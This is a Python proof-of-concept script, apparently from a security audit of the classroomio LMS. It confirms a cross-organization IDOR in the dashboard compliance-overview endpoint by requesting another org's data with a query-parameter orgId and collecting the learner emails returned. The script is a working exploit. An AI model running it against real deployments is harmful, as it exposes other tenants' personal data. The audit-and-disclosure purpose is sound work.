#!/usr/bin/env python3
"""
VULN-014 (F-09) — Dashboard analytics cross-org PII IDOR: authorization is anchored
                  to the `cio-org-id` HEADER org, but the data query uses the
                  client-supplied `orgId`/`siteName` QUERY param (never reconciled).

Vulnerable code (targets/classroomio/):
  * handler: apps/api/src/routes/dash/stats.ts:138-153  GET /dash/compliance-overview
             (authMiddleware, orgAdminMiddleware) reads `const { orgId } = c.req.valid('query')`
             (:145) and calls getOrgComplianceOverview(orgId)  — query param drives the query.
  * also:    stats.ts:43-49 GET /dash/stats uses query `orgId`/`siteName` the same way.
  * authz:   apps/api/src/middlewares/org-member.ts:26-53 (and org-admin.ts) validate the
             role against the HEADER org only and set c.set('orgId', headerOrg) — never
             compared to the query orgId.
  * PII sink: packages/db/src/queries/course/compliance.ts filters learner rows by the
             passed orgId and returns profile.email; getOrgComplianceOverview surfaces a
             `learners[].email` array.
  * SAFE contrast: stats.ts:125-137 GET /dash/top-courses uses `c.get('orgId')` (header org),
             ignoring the query — proving the intended pattern.

Class: CWE-639 IDOR / authorization-channel divergence (cross-tenant confidentiality).

Flaw: proving membership in ONE org (header) authorizes reading ANY org's analytics/
compliance learners (query orgId), including their email addresses.

What this proves HERE:
  (1) the endpoint returns learner EMAILS (seed a compliance course+student in our org;
      compliance-overview?orgId=<ourOrg> returns that email — PII exposure), and
  (2) the QUERY orgId selects the data, not the authorized header: the SAME admin (a
      member of ONLY our org) gets HTTP 200 (not 403) for compliance-overview?orgId=<a
      DIFFERENT org they don't belong to>, scoped to that org — the access-control break.
Full cross-tenant harvest scales with the victim org's learner count (NEEDS_MANUAL for a
populated victim); the authorization break itself is CONFIRMED here.
"""
import os
import sys
import uuid

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import log, banner, verdict, admin_login, make_student, psql, rid, ORG_ID, ADMIN_USER_ID  # noqa: E402

VULN = "VULN-014"
HERE = os.path.dirname(os.path.abspath(__file__))


def cleanup(course_id, group_id):
    if course_id:
        psql(f"delete from course_newsfeed where course_id='{course_id}';")
        psql(f"delete from course where id='{course_id}';")
    if group_id:
        psql(f"delete from groupmember where group_id='{group_id}';")
        psql(f"delete from \"group\" where id='{group_id}';")


def main():
    banner(VULN, "Dashboard compliance-overview cross-org PII IDOR (authz=header, data=query orgId)")
    admin = admin_login()
    log("SETUP", f"admin is a member of ONLY: {list(admin.org_roles().keys())}")

    # --- Seed our own org with a COMPLIANCE course + enrolled student --------
    log("STEP", "seed: create a COMPLIANCE course in OUR org and enroll a student (known email)")
    rc = admin.post("/course", org=True, json={"title": f"comp-{rid('c')}", "description": "idor probe",
                                               "type": "COMPLIANCE", "organizationId": ORG_ID,
                                               "compliance": {"retakeIntervalMonths": 12}})
    if rc.status_code not in (200, 201):
        log("FAIL", f"could not seed compliance course: {rc.status_code} {rc.text[:160]}")
        verdict(VULN, "FAILED", "seeding failed")
        sys.exit(1)
    d = rc.json()["data"]
    course_id = d["course"]["id"]
    group_id = d.get("groupId")
    stu, info = make_student(admin, course_id=course_id)
    learner_email = info["email"]
    log("SETUP", f"seeded compliance course {course_id[:8]}.. with student {learner_email} (role {info['role_in_org']})")

    try:
        # --- (1) our-org read: endpoint returns learner emails (PII) ----------
        log("STEP", f"GET /dash/compliance-overview?orgId=<OUR ORG>  (header cio-org-id=OUR ORG)")
        r_self = admin.get(f"/dash/compliance-overview?orgId={ORG_ID}", org=True)
        self_json = r_self.json() if r_self.status_code == 200 else {}
        self_learners = (self_json.get("data") or {}).get("learners", [])
        self_emails = [x.get("email") for x in self_learners]
        log("INFO", f"  -> HTTP {r_self.status_code}  totalLearners={((self_json.get('data') or {}).get('summary') or {}).get('totalLearners')}  emails={self_emails}")
        pii_leak = learner_email in self_emails
        if pii_leak:
            log("PROOF", f"compliance-overview returned learner EMAIL {learner_email} in learners[].email → the "
                         f"endpoint exposes learner PII")

        # --- (2) cross-org read: a foreign / arbitrary org is served 200 ------
        foreign = psql(f"select id from organization where id <> '{ORG_ID}' limit 1;")
        foreign = foreign.strip() if foreign else None
        arbitrary = foreign or str(uuid.uuid4())
        kind = "FOREIGN real org (admin is NOT a member)" if foreign else "arbitrary non-existent org id"
        if foreign:
            mem = psql(f"select count(*) from organizationmember where organization_id='{foreign}' and profile_id='{ADMIN_USER_ID}';")
            log("INFO", f"  target {foreign} membership rows for admin = {mem} (0 == not a member)")

        log("STEP", f"GET /dash/compliance-overview?orgId={arbitrary}  ({kind}); header stays OUR ORG")
        r_x = admin.get(f"/dash/compliance-overview?orgId={arbitrary}", org=True, org_id=ORG_ID)
        x_json = r_x.json() if r_x.status_code == 200 else {}
        x_learners = (x_json.get("data") or {}).get("learners", [])
        x_emails = [x.get("email") for x in x_learners]
        log("INFO", f"  -> HTTP {r_x.status_code}  learners={len(x_learners)}  emails={x_emails}")
        served_foreign = r_x.status_code == 200
        scoped_to_query = learner_email not in x_emails  # NOT our org's data → the query orgId chose the scope
        if served_foreign and scoped_to_query:
            log("PROOF", f"same admin (member of ONLY our org) got HTTP 200 for orgId={arbitrary} scoped to THAT "
                         f"org (our seeded learner {learner_email} absent) → authorization is on the header org, "
                         f"data is on the client's query orgId; a non-member org is served, not rejected (403)")

        # --- SAFE contrast: /dash/top-courses ignores the query orgId ---------
        r_top = admin.get(f"/dash/top-courses?orgId={arbitrary}&days=30", org=True, org_id=ORG_ID)
        log("INFO", f"  contrast GET /dash/top-courses?orgId={arbitrary} -> HTTP {r_top.status_code} "
                    f"(uses c.get('orgId'); query orgId ignored — stats.ts:128)")

        with open(os.path.join(HERE, "response.txt"), "w") as f:
            f.write(f"OUR ORG {ORG_ID}\n")
            f.write(f"[1] GET /dash/compliance-overview?orgId=<OUR ORG> (header=OUR ORG) -> HTTP {r_self.status_code}\n")
            f.write(f"    learners[].email = {self_emails}  (seeded student = {learner_email})\n\n")
            f.write(f"[2] GET /dash/compliance-overview?orgId={arbitrary} ({kind}) (header=OUR ORG) -> HTTP {r_x.status_code}\n")
            f.write(f"    learners = {len(x_learners)}  emails = {x_emails}\n")
            f.write(f"    served_foreign(200)={served_foreign}  scoped_to_query_org={scoped_to_query}\n\n")
            f.write(f"[contrast] GET /dash/top-courses?orgId={arbitrary} -> HTTP {r_top.status_code} "
                    f"(SAFE: uses header org, ignores query)\n")

        if pii_leak and served_foreign and scoped_to_query:
            verdict(VULN, "CONFIRMED",
                    "compliance-overview leaks learner emails AND serves whatever org the query orgId names to a "
                    "non-member (authz on header, data on query) — cross-tenant PII IDOR; harvest scales with victim data")
            log("OK", "authorization-channel divergence + learner-email exposure confirmed")
            _ok = True
        else:
            verdict(VULN, "NEEDS_MANUAL",
                    f"pii_leak={pii_leak} served_foreign={served_foreign} scoped_to_query={scoped_to_query}")
            _ok = False
    finally:
        log("STEP", "cleanup: deleting the seeded compliance course/group + enrollment")
        cleanup(course_id, group_id)
        left = psql(f"select count(*) from \"group\" where id='{group_id}';")
        log("INFO", f"  post-cleanup group rows for seeded id = {left}")

    sys.exit(0 if _ok else 0)


if __name__ == "__main__":
    main()
